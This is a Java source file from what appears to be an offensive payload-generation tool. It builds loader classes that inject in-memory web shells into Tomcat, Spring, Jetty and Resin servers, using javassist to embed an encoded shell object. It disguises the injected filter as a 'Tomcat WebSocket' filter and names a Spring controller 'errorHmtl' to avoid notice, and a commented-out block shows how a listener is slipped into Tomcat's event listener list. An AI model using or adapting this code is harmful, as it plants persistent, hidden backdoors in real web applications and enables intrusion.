package com.ppp.middleware.builder;

import com.ppp.JavaClassHelper;
import com.ppp.annotation.Builder;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.Middleware;
import com.ppp.utils.RanDomUtils;
import com.ppp.utils.maker.JavaClassUtils;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

/**
 * @author Whoopsunix
 */
@Builder(Builder.Loader)
public class MSLoaderBuilder {
    /**
     * Tomcat
     */
    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Listener)
    public byte[] tomcatListener(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
        return defaultLoader(cls, MSGzipBase64, javaClassHelper);

        // 暂时放弃，等写全了看看情况再考虑简化代码
//        ClassPool classPool = ClassPool.getDefault();
//        classPool.insertClassPath(new ClassClassPath(cls));
////        classPool.importPackage("javax.servlet.http");
//        classPool.importPackage("java.util");
//        classPool.importPackage("java.lang.reflect");
//
//        CtClass ctClass = classPool.getCtClass(cls.getName());
//
//        JavaClassUtils.fieldChangeIfExist(ctClass, "gzipObject", String.format("private static String gzipObject = \"%s\";", MSGzipBase64));
//
//        CtMethod injectCtMethod = ctClass.getDeclaredMethod("inject");
//        injectCtMethod.setBody("{" +
//                "Object[] applicationEventListenersObjects = null;\n" +
//                "List applicationEventListeners;\n" +
//                "Object object = getObject();\n" +
//                "try {\n" +
//                "    applicationEventListeners = (List) getFieldValue($1, \"applicationEventListenersList\");\n" +
//                "    for (int i = 0; i < applicationEventListeners.size(); i++) {\n" +
//                "        if (applicationEventListeners.get(i).getClass().getName().contains(object.getClass().getName())) {\n" +
//                "            return;\n" +
//                "        }\n" +
//                "    }\n" +
//                "} catch (Exception e) {\n" +
//                "\n" +
//                "}\n" +
//                "\n" +
//                "try {\n" +
//                "    applicationEventListenersObjects = (Object[]) getFieldValue($1, \"applicationEventListenersObjects\");\n" +
//                "    for (int i = 0; i < applicationEventListenersObjects.length; i++) {\n" +
//                "        Object applicationEventListenersObject = applicationEventListenersObjects[i];\n" +
//                "        if (applicationEventListenersObject instanceof Proxy && object instanceof Proxy) {\n" +
//                "            Object h = getFieldValue(applicationEventListenersObject, \"h\");\n" +
//                "            Object h2 = getFieldValue(object, \"h\");\n" +
//                "            if (h.getClass().getName().contains(h2.getClass().getName())) {\n" +
//                "                return;\n" +
//                "            }\n" +
//                "        } else {\n" +
//                "            if (applicationEventListenersObject.getClass().getName().contains(object.getClass().getName())) {\n" +
//                "                return;\n" +
//                "            }\n" +
//                "        }\n" +
//                "    }\n" +
//                "} catch (Exception e) {\n" +
//                "\n" +
//                "}\n" +
//                "\n" +
//                "if (applicationEventListenersObjects != null) {\n" +
//                "    Object[] newApplicationEventListenersObjects = new Object[applicationEventListenersObjects.length + 1];\n" +
//                "    System.arraycopy(applicationEventListenersObjects, 0, newApplicationEventListenersObjects, 0, applicationEventListenersObjects.length);\n" +
//                "    newApplicationEventListenersObjects[newApplicationEventListenersObjects.length - 1] = object;\n" +
//                "    setFieldValue($1, \"applicationEventListenersObjects\", newApplicationEventListenersObjects);\n" +
//                "} else {\n" +
//                "    List applicationEventListenersList = (List) getFieldValue($1, \"applicationEventListenersList\");\n" +
//                "    applicationEventListenersList.add(object);\n" +
//                "}" +
//                "}");
//
//        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
//        return JavaClassModifier.toBytes(ctClass);
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Servlet)
    public byte[] tomcatServlet(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
        String name = javaClassHelper.getNAME();
        javaClassHelper.setNAME(name + "Servlet");

        return defaultLoader(cls, MSGzipBase64, javaClassHelper);
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Filter)
    public byte[] tomcatFilter(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
        StringBuilder sb = new StringBuilder();
        String name = javaClassHelper.getCLASSNAME();
        String simpleTypeName = name.substring(name.lastIndexOf(".") + 1);

        for (int i = 0; i < simpleTypeName.length(); ++i) {
            if (Character.isUpperCase(simpleTypeName.charAt(i))) {
                sb.append(simpleTypeName.charAt(i));
            }
        }

        String filterName = String.format("Tomcat WebSocket (%s%s) Filter", sb.toString(), RanDomUtils.generateRandomOnlyNum(3));
        javaClassHelper.setNAME(filterName);

        return defaultLoader(cls, MSGzipBase64, javaClassHelper);
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Executor)
    public byte[] tomcatExecutor(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
        return defaultLoader(cls, MSGzipBase64, javaClassHelper);
    }


    /**
     * Spring
     */
    @Middleware(Middleware.Spring)
    @MemShell(MemShell.Controller)
    public byte[] controller(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
        StringBuilder sb = new StringBuilder();
        String name = javaClassHelper.getCLASSNAME();
        String simpleTypeName = name.substring(name.lastIndexOf(".") + 1);

        for (int i = 0; i < simpleTypeName.length(); ++i) {
            if (Character.isUpperCase(simpleTypeName.charAt(i))) {
                sb.append(simpleTypeName.charAt(i));
            }
        }

        String msName = sb.append("#").append("errorHmtl").toString();
        javaClassHelper.setNAME(msName);

        return defaultLoader(cls, MSGzipBase64, javaClassHelper);
    }

    /**
     * Jetty
     */
    @Middleware(Middleware.Jetty)
    @MemShell(MemShell.Listener)
    public byte[] jettyListener(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
        return defaultLoader(cls, MSGzipBase64, javaClassHelper);

    }

    /**
     * Resin
     */
    @Middleware(Middleware.Resin)
    @MemShell(MemShell.Listener)
    public byte[] resinListener(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
        return defaultLoader(cls, MSGzipBase64, javaClassHelper);

    }


    /**
     * 直接加载
     */
    public static byte[] defaultLoader(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(cls));
//        classPool.importPackage("javax.servlet.http");
        classPool.importPackage("java.util");
        classPool.importPackage("java.lang.reflect");

        CtClass ctClass = classPool.getCtClass(cls.getName());

        JavaClassUtils.fieldChangeIfExist(ctClass, "gzipObject", String.format("private static String gzipObject = \"%s\";", MSGzipBase64));

        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
        return JavaClassModifier.toBytes(ctClass);
    }

    /**
     * 直接加载
     */
//    public static CtClass defaultCtClassLoader(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
//        ClassPool classPool = ClassPool.getDefault();
//        classPool.insertClassPath(new ClassClassPath(cls));
////        classPool.importPackage("javax.servlet.http");
//        classPool.importPackage("java.util");
//        classPool.importPackage("java.lang.reflect");
//
//        CtClass ctClass = classPool.getCtClass(cls.getName());
//
//        JavaClassUtils.fieldChangeIfExist(ctClass, "gzipObject", String.format("private static String gzipObject = \"%s\";", MSGzipBase64));
//
//        JavaClassModifier.fieldChange(cls, ctClass, javaClassHelper);
//        JavaClassModifier.ctClassBuilder(ctClass, javaClassHelper, null);
//
//        return ctClass;
//    }
}
